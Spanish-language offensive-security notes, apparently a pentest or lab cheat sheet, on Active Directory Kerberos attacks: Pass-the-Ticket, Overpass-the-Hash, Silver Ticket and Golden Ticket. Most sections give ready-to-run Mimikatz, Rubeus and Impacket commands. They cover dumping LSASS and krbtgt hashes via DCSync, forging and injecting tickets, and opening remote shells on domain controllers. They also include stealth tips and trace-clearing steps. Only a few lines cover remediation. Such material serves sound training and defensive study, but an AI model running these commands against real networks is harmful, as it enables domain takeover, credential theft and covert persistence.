**Pass-the-Ticket** — Lo usas cuando ya estás dentro de una máquina del dominio con privilegios de admin local. Corres `Rubeus triage` y ves que hay sesiones activas de otros usuarios (helpdesk, sysadmin, Domain Admin) que se conectaron a esa máquina. Ocurre mucho en servidores de salto (jump servers), servidores de archivos, o máquinas donde varios admins se conectan. No necesitas crackear nada ni tener hashes — el ticket ya está ahí.

---

**Overpass-the-Hash / Pass-the-Key** — Lo usas cuando sacaste hashes de LSASS (`sekurlsa::logonpasswords`) pero el entorno tiene SMB signing obligatorio o NTLM restringido, impidiendo Pass-the-Hash clásico. También cuando quieres moverse a máquinas donde el usuario tiene acceso pero no hay tickets activos. En labs lo ves cuando te dan un hash y el entorno claramente es Kerberos-only.

---

**Silver Ticket** — Lo usas cuando comprometiste una máquina específica y tienes su hash de cuenta de máquina (`SERVIDOR$`), pero no llegaste al DC todavía. Ocurre cuando comprometiste un servidor SQL, web, o de archivos via explotación directa y extrajiste el hash local. Te da acceso solo a esa máquina pero sin contactar el DC, útil cuando hay monitoreo intenso del DC. También cuando necesitas acceso a un servicio específico como MSSQL o CIFS en una sola máquina.

---

**Golden Ticket** — Lo usas después de comprometer el DC completamente (DCSync exitoso con hash de `krbtgt`). Es persistencia post-explotación. En labs lo identificas cuando ya eres Domain Admin y el ejercicio te pide demostrar persistencia o acceder a un recurso que solo Administrator puede ver. También cuando el DC ya cambió contraseñas y quieres mantener acceso.

# Golden Ticket (Windows)

Ataque que permite forjar un TGT completamente válido usando el hash NTLM de la cuenta `krbtgt`. Con un Golden Ticket se puede impersonar a **cualquier usuario** (incluso usuarios inexistentes) con cualquier privilegio, sin restricción de tiempo real. Es uno de los ataques de persistencia más potentes en AD.

> **Links:** [Mimikatz](https://github.com/gentilkiwi/mimikatz) | [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

---

## Explicación

En Kerberos, el TGT es como la identificación maestra del usuario, y está firmado con la clave de la cuenta `krbtgt` (una cuenta especial del DC). Normalmente solo el DC puede crear TGTs porque es el único que conoce esa clave.

Si un atacante obtiene el hash NTLM de `krbtgt` (por ejemplo tras un DCSync exitoso), puede crear sus propios TGTs sin pedirle permiso a nadie. Puede poner cualquier nombre de usuario, cualquier grupo (como Domain Admins), y cualquier fecha de expiración (incluso 10 años). El DC no verifica el contenido del TGT — solo verifica que esté firmado con la clave correcta de `krbtgt`. Si está bien firmado, lo acepta sin preguntar.

Lo peligroso adicional es que cambiar la contraseña de `krbtgt` debe hacerse **dos veces** con tiempo entre ambos cambios (mínimo 10 horas), para que los cambios se repliquen en todo el dominio. En ese ventana de tiempo el atacante puede seguir usando su Golden Ticket, e incluso obtener uno nuevo si observa el cambio.

---

## Información necesaria para forjar el Golden Ticket

- Nombre del dominio
- SID del dominio
- Nombre del usuario a impersonar
- Hash NTLM de `krbtgt`

---

## Paso 1 - Obtener el SID del dominio

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```

---

## Paso 2 - Obtener el hash NTLM de krbtgt (DCSync)

Requiere una cuenta con privilegios de replicación de dominio (Domain Admin, o cuenta con DCSync configurado).

```powershell
.\mimikatz.exe
lsadump::dcsync /user:krbtgt /domain:domain.local
exit
```

Buscar el valor `Hash NTLM:` en el output.

---

## Paso 3 - Forjar el Golden Ticket

```powershell
.\mimikatz.exe
kerberos::golden /domain:<domain.local> /user:<usuario_a_impersonar> /sid:<SID_dominio> /rc4:<NTHASH_krbtgt> /ptt
exit

## Ejemplo

.\mimikatz.exe
kerberos::golden /domain:domain.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:810d754e118439bab1e1d13216150299 /ptt
```

### Con AES256 (más sigiloso que RC4)

```powershell
kerberos::golden /domain:<domain.local> /user:<usuario_a_impersonar> /sid:<SID_dominio> /aes256:<AES256_krbtgt> /ptt
```

### Con grupos adicionales (ej: Enterprise Admins)

```powershell
kerberos::golden /domain:<domain.local> /user:<usuario_a_impersonar> /sid:<SID_dominio> /rc4:<NTHASH_krbtgt> /groups:512,513,518,519,520 /ptt
```

### Guardar el ticket en archivo en vez de inyectarlo

```powershell
kerberos::golden /domain:<domain.local> /user:<usuario_a_impersonar> /sid:<SID_dominio> /rc4:<NTHASH_krbtgt> /ticket:golden.kirbi
```

Para inyectarlo después:

```powershell
kerberos::ptt golden.kirbi
```

---

## Paso 4 - Verificar el ticket

```cmd
klist
```

El ticket aparece con `Server: krbtgt/domain.local` y una fecha de expiración de 10 años.

---

## Paso 5 - Usar el Golden Ticket

```powershell
# WinRM / PSRemoting
Enter-PSSession dc01
whoami

## opcion 2 
Enter-PSSession dc01.domain.local

# Acceso a archivos via SMB
dir \\dc01\c$
type \\dc01\c$\Users\Administrator\Documents\goldenticket.txt

# Ejecutar comandos remotamente
Invoke-Command -ComputerName dc01 -ScriptBlock { whoami }
```

---

## Notas importantes

- El Golden Ticket puede impersonar usuarios **inexistentes** en el dominio y el DC lo aceptará igual.
- Para stealth en pentests reales, usar usuarios que sí existen para evitar alertas por usuarios inexistentes en logs.
- Con `/ptt` el ticket se inyecta en la sesión actual. Los TGS solicitados a partir de él quedan cacheados y aparecen en `klist`.
- Cambiar el hash de `krbtgt` **dos veces** (con al menos 10 horas de diferencia entre ambos cambios) es el único remedio para invalidar Golden Tickets existentes.

---

## Resumen del flujo

- Obtener SID del dominio con PowerView (`Get-DomainSID`)
- Obtener hash NTLM de `krbtgt` con Mimikatz DCSync (`lsadump::dcsync /user:krbtgt`)
- Forjar el Golden Ticket con Mimikatz (`kerberos::golden ... /ptt`)
- Verificar con `klist`
- Acceder a recursos del dominio impersonando al usuario elegido


# Golden Ticket (Linux)

Versión del ataque Golden Ticket usando herramientas de Impacket desde Linux. El concepto es el mismo que desde Windows: forjar un TGT usando el hash de `krbtgt`, pero aquí se genera un archivo `.ccache` que se usa con las herramientas de Impacket.

> **Links:** [Impacket ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) | [Impacket secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) | [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) | [Hashcat](https://hashcat.net/hashcat/)

---

## Explicación

En Windows, el Golden Ticket se inyecta directamente en memoria con Mimikatz. En Linux, el proceso es diferente: se genera un archivo `.ccache` (un archivo que contiene tickets Kerberos) y se le dice al sistema que use ese archivo en lugar de pedir tickets al DC. Es como tener una copia de tu identificación maestra guardada en un archivo que puedes usar cuando quieras.

El resultado es el mismo: puedes hacerte pasar por cualquier usuario del dominio, incluyendo Administrator, sin que el DC pueda impedirlo mientras no cambie dos veces el hash de `krbtgt`.

---

## Información necesaria

- Nombre del dominio (FQDN)
- SID del dominio
- Hash NTLM de `krbtgt`
- Usuario a impersonar

---

## Paso 1 - Obtener el SID del dominio

### Con lookupsid.py

```bash
lookupsid.py DOMAIN.LOCAL/<user>:'<password>'@<IP_DC>
```

Buscar la línea `DOMAIN-SID` en el output. El SID tiene formato `S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX`.

### Con netexec

```bash
netexec ldap <IP_DC> -u <user> -p '<password>' --get-sid
```

---

## Paso 2 - Obtener el hash NTLM de krbtgt (DCSync)

```bash
secretsdump.py DOMAIN.LOCAL/<user>:'<password>'@<IP_DC> -just-dc-user krbtgt
```

Buscar `krbtgt:502:<LM_hash>:<NT_hash>:::` en el output. El `NT_hash` es el que necesitas.

### Alternativa con netexec

```bash
netexec smb <IP_DC> -u <user> -p '<password>' --ntds --user krbtgt
```

---

## Paso 3 - Forjar el Golden Ticket

Con `ticketer.py` se genera el archivo `.ccache` directamente.

```bash
ticketer.py -nthash <NTHASH_krbtgt> -domain-sid <SID_dominio> -domain DOMAIN.LOCAL <usuario_a_impersonar>
```

El ticket se guarda como `<usuario_a_impersonar>.ccache`.

### Con AES256 (más sigiloso)

Para obtener la AES256 key de krbtgt:

```bash
secretsdump.py DOMAIN.LOCAL/<user>:'<password>'@<IP_DC> -just-dc-user krbtgt
```

Buscar `Kerberos keys:` → `aes256-cts-hmac-sha1-96`.

```bash
ticketer.py -aesKey <AES256_krbtgt> -domain-sid <SID_dominio> -domain DOMAIN.LOCAL <usuario_a_impersonar>
```

### Con grupos adicionales

```bash
ticketer.py -nthash <NTHASH_krbtgt> -domain-sid <SID_dominio> -domain DOMAIN.LOCAL -groups 512,513,518,519,520 <usuario_a_impersonar>
```

### Con duración personalizada (en horas)

```bash
ticketer.py -nthash <NTHASH_krbtgt> -domain-sid <SID_dominio> -domain DOMAIN.LOCAL -duration 87600 <usuario_a_impersonar>
```

---

## Paso 4 - Exportar el ticket

```bash
export KRB5CCNAME=./<usuario_a_impersonar>.ccache
```

---

## Paso 5 - Usar el Golden Ticket

### Verificar el ticket

```bash
klist
```

### Acceder al DC y ejecutar comandos

```bash
# Shell interactiva con psexec
psexec -k -no-pass dc01.domain.local

psexec.py -k -no-pass DOMAIN.LOCAL/<usuario_a_impersonar>@dc01.domain.local

# Especificando IPs si el DNS no resuelve
psexec.py -k -no-pass -dc-ip <IP_DC> -target-ip <IP_DC> DOMAIN.LOCAL/<usuario_a_impersonar>@DC01

nxc smb <target> -k --use-kcache --kdcHost <DC_IP>

# wmiexec (semi-interactivo, menos ruidoso)
wmiexec.py -k -no-pass DOMAIN.LOCAL/<usuario_a_impersonar>@dc01.domain.local
wmiexec.py -k -no-pass -dc-ip <IP_DC> -target-ip <IP_DC> DOMAIN.LOCAL/<usuario_a_impersonar>@DC01

# Acceder a archivos via SMB
smbclient.py -k -no-pass DOMAIN.LOCAL/<usuario_a_impersonar>@dc01.domain.local

# DCSync con el Golden Ticket
secretsdump.py -k -no-pass DOMAIN.LOCAL/<usuario_a_impersonar>@dc01.domain.local
```

---

## Notas importantes

- El ticket generado tiene por defecto una duración de **10 años**.
- El FQDN del DC debe estar resuelto en `/etc/hosts` antes de usarlo.
- Si el DC rechaza el ticket, verificar que el SID del dominio y el hash de `krbtgt` son correctos — un solo carácter incorrecto invalida todo el ticket.
- El remedio para invalidar Golden Tickets es cambiar el hash de `krbtgt` **dos veces** con al menos 10 horas entre cambios.

---

## Resumen del flujo

- Obtener SID del dominio con `lookupsid.py` o `netexec --get-sid`
- Obtener hash NTLM de `krbtgt` con `secretsdump.py -just-dc-user krbtgt`
- Forjar el ticket con `ticketer.py -nthash ... -domain-sid ... -domain ... <usuario>`
- Exportar con `export KRB5CCNAME=./<usuario>.ccache`
- Acceder con `psexec.py -k -no-pass` o `wmiexec.py -k -no-pass`

# Silver Ticket (Windows)

Ataque que permite forjar un **Service Ticket (TGS)** directamente usando el hash NTLM de la cuenta de servicio (o cuenta de máquina). A diferencia del Golden Ticket, no requiere el hash de `krbtgt` ni comunicación con el DC para usarlo — el ticket se presenta directamente al servicio objetivo.

> **Links:** [Mimikatz](https://github.com/gentilkiwi/mimikatz) | [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) | [SPNs en Windows](https://adsecurity.org/?page_id=183)

---

## Explicación

En Kerberos, cuando quieres acceder a un servicio (por ejemplo, los archivos compartidos de un servidor), el DC te da un "pase temporal" (TGS) cifrado con la clave del servicio. El servidor verifica ese pase descifrándolo con su propia clave y, si todo está bien, te da acceso.

El Silver Ticket explota esto de forma diferente al Golden Ticket: en vez de forjar la "identificación maestra" (TGT), se forja directamente el "pase temporal" (TGS) para un servicio específico. Esto es posible si tienes el hash NTLM de la cuenta que ejecuta ese servicio (por ejemplo, la cuenta de máquina `SERVER01$`).

La ventaja es que **no necesitas contactar al DC** para usar el Silver Ticket — vas directo al servicio, que no sabe que el ticket fue forjado. La desventaja es que el ticket solo sirve para ese servicio en específico, no para todo el dominio como el Golden Ticket.

En entornos modernos (Windows Server 2019+) con PAC verification habilitado, el Silver Ticket puede ser detectado porque el servicio consulta al DC para validar el PAC. Sin embargo en muchos entornos esto no está habilitado por defecto.

---

## Información necesaria

- Nombre del dominio
- SID del dominio
- Hash NTLM de la cuenta de servicio (o cuenta de máquina)
- SPN del servicio objetivo
- Usuario a impersonar

---

## Paso 1 - Obtener el SID del dominio

```powershell
Import-Module .\PowerView.ps1
Get-DomainSID
```

---

## Paso 2 - Obtener el hash NTLM de la cuenta de servicio

### Desde LSASS (si se tiene acceso al servidor)

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
exit
```

### Via DCSync (si se tiene acceso de replicación)

```powershell
.\mimikatz.exe
lsadump::dcsync /user:<SERVICIO>$ /domain:domain.local
exit
```

---

## Paso 3 - Forjar el Silver Ticket

```powershell
.\mimikatz.exe
kerberos::golden /domain:<domain.local> /user:<usuario_a_impersonar> /sid:<SID_dominio> /rc4:<NTHASH_servicio> /target:<server.domain.local> /service:<tipo_servicio> /ptt
exit

## Ejemplo:
kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.domain.local /service:cifs 

kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-2974783224-3764228556-2640795941 /rc4:ff955e93a130f5bb1a6565f32b7dc127 /target:sql01.domain.local /service:cifs /ticket:sql01.kirbi
```

### Parámetros clave

- `/target` — FQDN del servidor que ofrece el servicio (ej: `dc01.domain.local`)
- `/service` — Tipo de servicio (ver tabla abajo)
- `/rc4` — Hash NTLM de la cuenta que ejecuta el servicio

### Tipos de servicio más comunes

- `cifs` — Acceso a archivos compartidos (SMB)
- `http` — WinRM y web services
- `host` — Tareas programadas, WMI, RDP
- `ldap` — Operaciones LDAP incluyendo DCSync
- `mssql` — SQL Server
- `rpcss` — RPC services
- `wsman` — WinRM (Windows Remote Management)
- `krbtgt` — Equivalente a Golden Ticket (solo si el target es el DC)

### Tipos de servicio y su uso
 
El valor de `/service` determina el SPN exacto para el que el ticket es válido. Un Silver Ticket forjado para `cifs` **no sirve** para `http`, ni viceversa — cada servicio corre bajo un SPN distinto aunque esté en la misma máquina, y Windows exige el ticket correspondiente al servicio que se está consumiendo.
 
- `cifs` — Acceso a archivos compartidos vía SMB (`dir \\host\c$`, `type`, `copy`). Es el más usado para leer/escribir archivos remotos.
- `http` / `www` — Servicios web. **No sirve para `Enter-PSSession`** — aunque suene relacionado a WinRM, PSRemoting depende del SPN `WSMAN`, no de `HTTP` genérico.
- `wsman` — El SPN específico que usa WinRM/PSRemoting. Si se necesita `Enter-PSSession`, este es el servicio correcto a forjar, no `http`.
- `host` — Cubre tareas programadas, `at`, WMI, y en muchos casos también habilita RDP y ejecución remota general. Es uno de los más versátiles.
- `ldap` — Operaciones LDAP contra el DC, incluyendo la posibilidad de ejecutar DCSync si el ticket se forja contra el propio DC.
- `mssql` / `MSSQLSvc` — Consultas y ejecución en SQL Server (requiere el formato `MSSQLSvc/host:puerto`).
- `rpcss` — Servicios RPC, usado por herramientas que dependen de DCOM/RPC.
- `krbtgt` — Si el target es el DC y el servicio es `krbtgt`, en la práctica es equivalente a un Golden Ticket (accede a todo).
### Por qué un ticket puede fallar en un uso específico
 
Si se forjó el ticket con `/service:HTTP` y luego se intenta `Enter-PSSession`, PowerShell internamente pide un ticket para el SPN `WSMAN/<host>`, que es distinto al `HTTP/<host>` forjado. Como no coinciden, la autenticación falla silenciosamente o cae de vuelta a NTLM (que a su vez puede fallar si NTLM está deshabilitado).
 
Para saber exactamente qué SPN necesita una acción, es útil revisar qué SPNs tiene registrados la cuenta objetivo con `setspn -L <cuenta>` y forjar el Silver Ticket con el servicio exacto correspondiente.
 
### Forjar varios servicios a la vez
 
Si no se sabe con certeza qué SPN se necesita, se pueden generar varios Silver Tickets (uno por servicio) para la misma cuenta y target:
 
```powershell
kerberos::golden /domain:<domain.local> /user:Administrator /sid:<SID> /rc4:<NTHASH> /target:<server> /service:cifs /ptt
kerberos::golden /domain:<domain.local> /user:Administrator /sid:<SID> /rc4:<NTHASH> /target:<server> /service:wsman /ptt
kerberos::golden /domain:<domain.local> /user:Administrator /sid:<SID> /rc4:<NTHASH> /target:<server> /service:host /ptt
```

### Con AES256 (más sigiloso)

```powershell
kerberos::golden /domain:<domain.local> /user:<usuario_a_impersonar> /sid:<SID_dominio> /aes256:<AES256_servicio> /target:<server.domain.local> /service:cifs /ptt
```

### Guardar el ticket en archivo

```powershell
kerberos::golden /domain:<domain.local> /user:<usuario_a_impersonar> /sid:<SID_dominio> /rc4:<NTHASH_servicio> /target:<server.domain.local> /service:cifs /ticket:silver.kirbi
```

Inyectar después:

```powershell
kerberos::ptt silver.kirbi
```

---

## Paso 4 - Verificar el ticket

```cmd
klist
```

El ticket muestra `Server: cifs/<target>` (o el servicio elegido) en lugar de `krbtgt/`.

---

## Paso 5 - Usar el Silver Ticket

### Acceso a archivos (CIFS)

```powershell
dir \\server.domain.local\c$
type \\server.domain.local\c$\Users\Administrator\Desktop\flag.txt
```

### WinRM (HTTP o WSMAN)

```powershell
Enter-PSSession server.domain.local
```

### DCSync con ticket LDAP (forjado contra el DC)

```powershell
.\mimikatz.exe
lsadump::dcsync /user:krbtgt
exit
```

---
## Sacrificial Process con Rubeus y PsExec (Sysinternals)
 
En vez de inyectar el Silver Ticket directamente en la sesión actual con `/ptt`, se puede guardar el ticket en archivo y usarlo en un **proceso sacrificial** — un proceso nuevo con credenciales limpias donde se inyecta el ticket, evitando sobrescribir tickets de la sesión actual (lo cual podría interrumpir servicios o sesiones activas).
 
### Paso 1 - Crear el Silver Ticket y guardarlo en archivo
 
```powershell
mimikatz.exe "kerberos::golden /domain:<domain.local> /user:Administrator /sid:<SID_dominio> /rc4:<NTHASH_servicio> /target:<server.domain.local> /service:cifs /ticket:silver.kirbi" exit
```
 
### Paso 2 - Crear el proceso sacrificial con Rubeus
 
```powershell
Rubeus.exe createnetonly /program:cmd.exe /show
```
 
Esto abre una nueva ventana `cmd.exe` con credenciales aleatorias (sin relación con el usuario actual), evitando tocar la sesión Kerberos existente.
 
### Paso 3 - Inyectar el ticket en el proceso sacrificial
 
Desde la nueva ventana `cmd.exe` abierta:
 
```cmd
Rubeus.exe ptt /ticket:silver.kirbi
```
 
### Paso 4 - Usar PsExec (Sysinternals) con el ticket inyectado
 
```cmd
PSExec.exe -accepteula \\sql01.domain.local cmd
```
 
Esto da una shell remota en el host objetivo usando el contexto Kerberos del ticket recién inyectado en el proceso sacrificial.
 
> **Nota:** `PSExec.exe` de Sysinternals es distinto de `psexec.py` de Impacket. El de Sysinternals usa la sesión Kerberos de Windows directamente (útil en el flujo con Rubeus/Mimikatz), mientras que `psexec.py` es la herramienta equivalente en Linux que trabaja con archivos `.ccache`.
 
---


## Diferencia clave con el Golden Ticket

- **Golden Ticket** — Forja el TGT usando el hash de `krbtgt`. Sirve para cualquier servicio en cualquier máquina del dominio. Requiere el hash de `krbtgt`.
- **Silver Ticket** — Forja el TGS directamente para un servicio específico. No necesita contactar al DC para usarlo. Solo requiere el hash de la cuenta de servicio (más fácil de obtener). Más sigiloso porque no hay comunicación con el DC.

---

## Resumen del flujo

- Obtener SID del dominio con PowerView (`Get-DomainSID`)
- Obtener hash NTLM de la cuenta de servicio (Mimikatz `sekurlsa::logonpasswords` o DCSync)
- Forjar el Silver Ticket con Mimikatz (`kerberos::golden /service:<tipo> /target:<server>`)
- Verificar con `klist`
- Usar según el servicio: `dir \\server\c$` para CIFS, `Enter-PSSession` para HTTP/WSMAN

# Silver Ticket (Linux)

Versión del ataque Silver Ticket usando herramientas de Impacket desde Linux. Se genera un archivo `.ccache` con el TGS forjado usando el hash de la cuenta de servicio y se usa directamente contra el servicio objetivo sin interactuar con el DC.

> **Links:** [Impacket ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) | [Impacket secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) | [lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py)

---

## Explicación

Desde Linux el proceso es muy similar al Golden Ticket: se usa `ticketer.py` para generar el ticket forjado, pero esta vez en lugar de usar el hash de `krbtgt`, se usa el hash de la cuenta de servicio específica. El resultado es un archivo `.ccache` que se puede usar directamente con psexec, wmiexec u otras herramientas de Impacket.

La diferencia práctica más importante respecto al Golden Ticket es que el Silver Ticket **no viaja por el DC** — va directo al servicio. Esto lo hace más difícil de detectar en entornos donde los logs de Kerberos están bien monitoreados, porque no genera eventos de solicitud de TGT ni TGS en el DC.

---

## Información necesaria

- Nombre del dominio (FQDN)
- SID del dominio
- Hash NTLM de la cuenta de servicio
- SPN del servicio objetivo (tipo y hostname)
- Usuario a impersonar

---

## Paso 1 - Obtener el SID del dominio

```bash
lookupsid.py DOMAIN.LOCAL/<user>:'<password>'@<IP_DC>
```

O con netexec:

```bash
netexec ldap <IP_DC> -u <user> -p '<password>' --get-sid
```

---

## Paso 2 - Obtener el hash NTLM de la cuenta de servicio

### Via DCSync

```bash
secretsdump.py DOMAIN.LOCAL/<user>:'<password>'@<IP_DC> -just-dc-user <cuenta_servicio>$
```

### Desde un host comprometido

```bash
secretsdump.py DOMAIN.LOCAL/<user>:'<password>'@<IP_HOST>
```

Buscar la línea `<cuenta>$:<RID>:<LM_hash>:<NT_hash>:::`. El `NT_hash` es el que se necesita.

---

## Paso 3 - Forjar el Silver Ticket

```bash
ticketer.py -nthash <NTHASH_servicio> -domain-sid <SID_dominio> -domain DOMAIN.LOCAL -spn <tipo_servicio>/<server.domain.local> <usuario_a_impersonar>
```

### Ejemplos por tipo de servicio

```bash
# CIFS - acceso a archivos
ticketer.py -nthash <NTHASH> -domain-sid <SID> -domain DOMAIN.LOCAL -spn cifs/dc01.domain.local Administrator

# HTTP - WinRM
ticketer.py -nthash <NTHASH> -domain-sid <SID> -domain DOMAIN.LOCAL -spn http/dc01.domain.local Administrator

# LDAP - DCSync y operaciones LDAP
ticketer.py -nthash <NTHASH> -domain-sid <SID> -domain DOMAIN.LOCAL -spn ldap/dc01.domain.local Administrator

# MSSQL
ticketer.py -nthash <NTHASH> -domain-sid <SID> -domain DOMAIN.LOCAL -spn MSSQLSvc/sql01.domain.local:1433 Administrator
```

### Con AES256 (más sigiloso)

```bash
ticketer.py -aesKey <AES256_servicio> -domain-sid <SID_dominio> -domain DOMAIN.LOCAL -spn cifs/dc01.domain.local Administrator
```

El ticket se guarda como `Administrator.ccache`.

---

## Paso 4 - Exportar el ticket

```bash
export KRB5CCNAME=./Administrator.ccache
```

---

## Paso 5 - Usar el Silver Ticket

### Verificar el ticket

```bash
klist
```

A diferencia del Golden Ticket, este ticket muestra el SPN del servicio específico (ej: `cifs/dc01.domain.local`) en vez de `krbtgt`.

### Acceso a archivos (CIFS)

```bash
smbclient.py -k -no-pass DOMAIN.LOCAL/Administrator@dc01.domain.local
```

### Shell interactiva

```bash
#psexec
impacket-smbclient -k -no-pass dc01.domain.local

# psexec
psexec.py -k -no-pass DOMAIN.LOCAL/Administrator@dc01.domain.local

# Si el DNS no resuelve
psexec.py -k -no-pass -dc-ip <IP_DC> -target-ip <IP_DC> DOMAIN.LOCAL/Administrator@DC01

# wmiexec
wmiexec.py -k -no-pass DOMAIN.LOCAL/Administrator@dc01.domain.local
wmiexec.py -k -no-pass -dc-ip <IP_DC> -target-ip <IP_DC> DOMAIN.LOCAL/Administrator@DC01
```

### DCSync con ticket LDAP

```bash
secretsdump.py -k -no-pass DOMAIN.LOCAL/Administrator@dc01.domain.local
```

---

## Diferencia con el Golden Ticket (Linux)

- **Golden Ticket** → `ticketer.py` sin `-spn`, usa hash de `krbtgt`, genera TGT válido para cualquier servicio
- **Silver Ticket** → `ticketer.py` con `-spn <servicio>/<host>`, usa hash de la cuenta de servicio, genera TGS solo para ese servicio/host

---

## Resumen del flujo

- Obtener SID del dominio con `lookupsid.py` o `netexec --get-sid`
- Obtener hash de la cuenta de servicio con `secretsdump.py -just-dc-user`
- Forjar el Silver Ticket con `ticketer.py -nthash ... -spn <servicio>/<host>`
- Exportar con `export KRB5CCNAME=./Administrator.ccache`
- Usar con `psexec.py`, `wmiexec.py`, `smbclient.py` o `secretsdump.py` según el servicio

# Pass-the-Ticket (PtT)

Técnica que consiste en robar un ticket Kerberos (TGT o TGS) de otro usuario de la misma máquina y usarlo para autenticarse como ese usuario sin necesitar su contraseña. A diferencia de Pass-the-Hash (que usa NTLM), PtT usa tickets Kerberos válidos ya emitidos.

> **Links:** [Mimikatz](https://github.com/gentilkiwi/mimikatz) | [Rubeus](https://github.com/GhostPack/Rubeus) | [Impacket](https://github.com/fortra/impacket)

---

## Explicación

Imagina que en tu computadora del trabajo hay tres personas usando sesiones simultáneas: tú, tu jefe, y el administrador del sistema. En Windows, todos esos usuarios tienen sus tickets Kerberos guardados en memoria (en el proceso LSASS). Si tienes privilegios de administrador local, puedes "robar" el ticket de cualquiera de ellos y usarlo como si fueras esa persona — sin necesitar su contraseña.

Es diferente del Golden/Silver Ticket porque no estás **creando** tickets falsos, sino **robando** tickets reales y legítimos que ya existen en la memoria del sistema. Estos tickets tienen una validez limitada (por defecto 10 horas para TGTs y la sesión para TGS), por lo que hay que actuar rápido.

---

## Exportar tickets desde memoria (Windows)

### Con Mimikatz - exportar todos los tickets

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
exit
```

Genera un archivo `.kirbi` por cada ticket en memoria. Los nombres siguen el formato `[número]-[usuario]@[servicio]-[dominio].kirbi`.

### Con Rubeus - listar tickets en memoria

```powershell
.\Rubeus.exe triage
```

Muestra todos los tickets con su usuario, servicio, fecha de expiración y LUID (identificador de sesión).

### Con Rubeus - exportar todos los tickets

```powershell
.\Rubeus.exe dump /nowrap
```

Exporta los tickets en formato Base64.

### Con Rubeus - exportar ticket de un usuario específico

```powershell
.\Rubeus.exe dump /user:<usuario> /nowrap
```

### Con Rubeus - exportar ticket de una sesión específica (LUID)

```powershell
.\Rubeus.exe dump /luid:<LUID> /nowrap
```

---

## Inyectar tickets en memoria (Windows)

### Con Mimikatz desde archivo .kirbi

```powershell
.\mimikatz.exe
kerberos::ptt <ticket.kirbi>
exit
```

### Con Rubeus desde archivo .kirbi

```powershell
.\Rubeus.exe ptt /ticket:<ticket.kirbi>
```

### Con Rubeus desde Base64

```powershell
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

### Inyectar en una sesión específica (LUID)

```powershell
.\Rubeus.exe ptt /ticket:<ticket> /luid:<LUID>
```

---

## Verificar el ticket activo en memoria

```cmd
klist
```

---

## Usar el ticket inyectado

Una vez inyectado, el sistema operativo usa automáticamente ese ticket para las autenticaciones Kerberos. No hace falta hacer nada extra:

```powershell
# Acceder a recursos del dominio
dir \\dc01.domain.local\c$
Enter-PSSession dc01.domain.local
Invoke-Command -ComputerName dc01.domain.local -ScriptBlock { whoami }
```

---

## Limpiar tickets de memoria (Windows)

Para no dejar rastros o para empezar con una sesión limpia:

```powershell
# Limpiar todos los tickets de la sesión actual
.\Rubeus.exe purge

# Limpiar con klist
klist purge
```

---

## Pass-the-Ticket desde Linux

En Linux los tickets se manejan como archivos `.ccache`. Si se obtiene el archivo de ticket de un usuario (por ejemplo, extrayendo del proceso de memoria de una máquina comprometida), se puede usar directamente.

### Convertir .kirbi a .ccache

```bash
# Usando impacket
ticketConverter.py <ticket.kirbi> <ticket.ccache>
```

### Convertir .ccache a .kirbi

```bash
ticketConverter.py <ticket.ccache> <ticket.kirbi>
```

### Usar el .ccache directamente

```bash
export KRB5CCNAME=./<ticket.ccache>
psexec.py -k -no-pass DOMAIN.LOCAL/<usuario>@<target>
```

---

## Extraer tickets desde Linux (ccache del sistema)

Si se compromete una máquina Linux unida al dominio, los tickets suelen estar en `/tmp/` con nombres como `krb5cc_<UID>`.

```bash
# Listar tickets disponibles
ls -la /tmp/krb5cc_*

# Usar el ticket directamente
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

---

## Diferencias entre PtT, Golden Ticket y Silver Ticket

- **Pass-the-Ticket** — Roba tickets **existentes y legítimos** de la memoria. Requiere acceso local. El ticket expira cuando expira el original.
- **Golden Ticket** — **Crea** un TGT falso usando el hash de `krbtgt`. No expira (10 años). Funciona para cualquier servicio del dominio.
- **Silver Ticket** — **Crea** un TGS falso para un servicio específico usando el hash de la cuenta de servicio. No necesita el DC para usarlo.

---

## Resumen del flujo (Windows)

- Identificar usuarios con tickets interesantes con `Rubeus triage`
- Exportar el ticket con `Rubeus dump /user:<usuario> /nowrap`
- Inyectar el ticket con `Rubeus ptt /ticket:<base64>` o `kerberos::ptt <archivo.kirbi>`
- Verificar con `klist`
- Acceder al recurso objetivo (`dir \\dc01\c$`, `Enter-PSSession`, etc.)
- Limpiar con `Rubeus purge` o `klist purge` al terminar

# Overpass-the-Hash / Pass-the-Key

Técnicas que permiten usar un **hash NTLM o una clave AES** de un usuario para obtener un ticket Kerberos (TGT) y moverse lateralmente en el dominio. Son el puente entre los ataques basados en NTLM (Pass-the-Hash) y los ataques Kerberos.

> **Links:** [Rubeus](https://github.com/GhostPack/Rubeus) | [Mimikatz](https://github.com/gentilkiwi/mimikatz) | [Impacket getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) | [Impacket psexec](https://github.com/fortra/impacket)

---

## Explicación

Imagina que tienes el hash NTLM de la contraseña de un usuario (por ejemplo, obtenido de la memoria del sistema con Mimikatz). Con Pass-the-Hash clásico, lo usarías para autenticarte vía NTLM directamente. Pero Kerberos es diferente: necesitas un ticket, no un hash.

**Overpass-the-Hash** resuelve esto: toma ese hash NTLM y lo usa para pedirle al DC un TGT válido como ese usuario. Una vez tienes el TGT, ya estás dentro del mundo Kerberos y puedes moverte lateralmente sin usar NTLM para nada más. Es especialmente útil en entornos que tienen NTLM deshabilitado o muy monitorado.

